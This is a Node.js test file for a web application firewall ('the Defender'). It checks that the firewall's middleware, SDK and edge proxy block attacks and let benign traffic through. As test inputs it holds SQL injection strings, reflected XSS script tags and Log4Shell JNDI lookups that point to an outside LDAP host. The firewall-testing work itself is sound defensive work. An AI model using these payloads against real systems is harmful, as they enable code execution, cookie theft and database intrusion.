// The code around the Defender's rules, in each shape it ships in: the dashboard's self-defense,
// the Express SDK and the edge proxy. The rules themselves are measured in defender-accuracy.test.mjs.
import assert from 'node:assert/strict';
import http from 'node:http';
import { test } from 'node:test';
import { createSelfDefense } from './defender/middleware.mjs';
import { createEdgeServer, routes } from './packages/defender-edge/server.mjs';
import { shannonDefender } from './packages/defender-sdk/index.mjs';

const mkReq = (method, url, { ip = '10.0.0.5', body, headers = {} } = {}) => ({
  method,
  url,
  originalUrl: url,
  path: url.split('?')[0],
  body,
  headers,
  ip,
  socket: {},
});
const run = (mw, req) => {
  const res = { code: null };
  res.status = (c) => {
    res.code = c;
    return res;
  };
  res.json = () => res;
  let nexted = false;
  mw(req, res, () => {
    nexted = true;
  });
  return { res, nexted };
};
const ATTACK = '/item?id=1%27%20OR%20%271%27=%271';

test('self-defense: bans and live reports keep working after 1,000 detections', () => {
  const d = createSelfDefense({
    mode: 'enforce',
    ban: { enabled: true, enforce: true, threshold: 5, windowMs: 60_000, ttlMs: 600_000 },
  });
  const seen = [];
  d.subscribe((e) => seen.push(e));
  // A busy site: detect-only matches (an apostrophe in a name) fill the board.
  for (let i = 0; i < 1100; i++) run(d.middleware, mkReq('GET', '/search?q=O%27Brien', { ip: '198.51.100.7' }));
  assert.ok(seen.filter((e) => e.type === 'detection').length >= 1100, 'every detection is still reported');
  const before = seen.length;
  for (let i = 0; i < 5; i++)
    assert.equal(run(d.middleware, mkReq('GET', ATTACK, { ip: '203.0.113.9' })).res.code, 403);
  assert.ok(seen.length >= before + 5, 'the attacks after the first thousand are reported too');
  const next = run(d.middleware, mkReq('GET', '/pricing', { ip: '203.0.113.9' }));
  assert.equal(next.res.code, 403, 'the repeat offender is banned');
  assert.equal(next.nexted, false);
  assert.equal(
    run(d.middleware, mkReq('GET', '/pricing', { ip: '198.51.100.7' })).nexted,
    true,
    'other addresses are untouched',
  );
});

test("self-defense: the edge proxy's own attack reports are not treated as attacks", () => {
  const d = createSelfDefense({
    mode: 'enforce',
    ban: { enabled: true, enforce: true, threshold: 3, windowMs: 60_000, ttlMs: 600_000 },
  });
  const report = {
    detections: [
      {
        host: 'shop.example.com',
        method: 'GET',
        url: 'shop.example.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E',
        cls: 'xss',
        enforced: true,
      },
    ],
  };
  for (let i = 0; i < 6; i++) {
    const out = run(
      d.middleware,
      mkReq('POST', '/api/platform/defender/edge/report', { ip: '192.0.2.50', body: report }),
    );
    assert.equal(out.nexted, true, 'the report reaches its route');
  }
  assert.equal(
    run(d.middleware, mkReq('GET', '/api/platform/defender/edge/routes', { ip: '192.0.2.50' })).nexted,
    true,
    'and the edge is not banned for sending them',
  );
});

test('self-defense: a Log4Shell lookup in a header is blocked, and headers are not kept', () => {
  const d = createSelfDefense({ mode: 'enforce' });
  const seen = [];
  d.subscribe((e) => seen.push(e));
  const out = run(
    d.middleware,
    mkReq('GET', '/', {
      headers: { 'x-api-version': '${jndi:ldap://203.0.113.9:1389/a}', cookie: 'session=secret-value' },
    }),
  );
  assert.equal(out.res.code, 403);
  assert.equal(seen[0].cls, 'rce-ssti');
  assert.ok(
    !JSON.stringify([seen, d.recent?.() ?? []]).includes('secret-value'),
    'no header value is stored or sent to listeners',
  );
  assert.equal(
    run(d.middleware, mkReq('GET', '/', { headers: { 'user-agent': 'Mozilla/5.0', cookie: "name=O'Brien" } })).nexted,
    true,
  );
});

test('SDK: a raw (Buffer) body and request headers are inspected', () => {
  const defend = shannonDefender({ mode: 'enforce' });
  const mw = typeof defend === 'function' ? defend : defend.middleware;
  const buffer = Buffer.from('{"user":"1\' OR \'1\'=\'1"}');
  assert.equal(run(mw, mkReq('POST', '/api/login', { body: buffer })).res.code, 403, 'express.raw() leaves a Buffer');
  assert.equal(
    run(mw, mkReq('GET', '/', { headers: { referer: 'https://x.example/${jndi:ldap://a/b}' } })).res.code,
    403,
  );
  assert.equal(run(mw, mkReq('POST', '/api/upload', { body: Buffer.from([0, 1, 2, 3, 255]) })).nexted, true);
  assert.equal(run(mw, mkReq('POST', '/api/notes', { body: { note: 'see ../images/logo.png' } })).nexted, true);
});

test('edge: a large upload is still judged on its URL and its first part', async () => {
  let received = 0;
  const origin = http.createServer((req, res) => {
    req.on('data', (d) => {
      received += d.length;
    });
    req.on('end', () => res.end('ok'));
  });
  await new Promise((resolve) => origin.listen(0, '127.0.0.1', resolve));
  routes.set('big.example.test', { origin: `http://127.0.0.1:${origin.address().port}`, mode: 'enforce' });
  const edge = createEdgeServer({ allowPrivateOrigins: true });
  await new Promise((resolve) => edge.listen(0, '127.0.0.1', resolve));
  const send = (path, body) =>
    new Promise((resolve) => {
      const req = http.request(
        {
          host: '127.0.0.1',
          port: edge.address().port,
          path,
          method: 'POST',
          headers: {
            host: 'big.example.test',
            'content-type': 'text/plain',
            'content-length': Buffer.byteLength(body),
          },
        },
        (res) => {
          res.resume();
          res.on('end', () => resolve(res.statusCode));
        },
      );
      // A refused upload may be cut off while it is still being sent.
      req.on('error', () => resolve(0));
      req.end(body);
    });
  const big = 'a'.repeat(3 * 1024 * 1024);
  try {
    assert.equal(await send('/upload', big), 200);
    assert.equal(received, big.length, 'an ordinary large upload passes through whole');
    received = 0;
    const attacked = await send('/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E', big);
    assert.ok(attacked === 403 || attacked === 0, `refused (got ${attacked})`);
    assert.equal(received, 0, 'nothing reached the site behind the edge');
    const inBody = await send('/upload', `{"q":"1' OR '1'='1"} ${big}`);
    assert.ok(inBody === 403 || inBody === 0, 'a payload in the first part of a large body is seen');
    assert.equal(received, 0);
  } finally {
    routes.delete('big.example.test');
    edge.closeAllConnections?.();
    origin.closeAllConnections?.();
    await new Promise((resolve) => edge.close(resolve));
    await new Promise((resolve) => origin.close(resolve));
  }
});
